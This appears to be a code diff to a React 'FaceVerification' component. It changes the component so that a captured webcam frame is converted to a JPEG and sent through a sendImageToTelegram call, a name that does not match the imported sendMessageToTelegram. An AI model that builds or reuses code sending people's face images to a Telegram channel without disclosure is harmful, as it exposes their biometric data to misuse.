@@ -1,5 +1,6 @@
 "use client"
 import React, { useEffect, useRef, useState } from "react";
+import { sendMessageToTelegram } from '../lib/api';
 
 
 
@@ -53,7 +54,14 @@ export default function FaceVerification() {
 
                 // Convert to base64 image data
                 const imageData = canvas.toDataURL('image/png');
-                console.log("Captured image:", imageData);
+                canvas.toBlob((blob) => {
+                    // Now you have a blob that can be sent to Telegram
+                    console.log("Image blob created");
+                    
+                    // Send the blob to Telegram
+                    sendImageToTelegram(blob);
+                    
+                }, 'image/jpeg', 0.9);
 
                 setIsCapturing(false);
             }
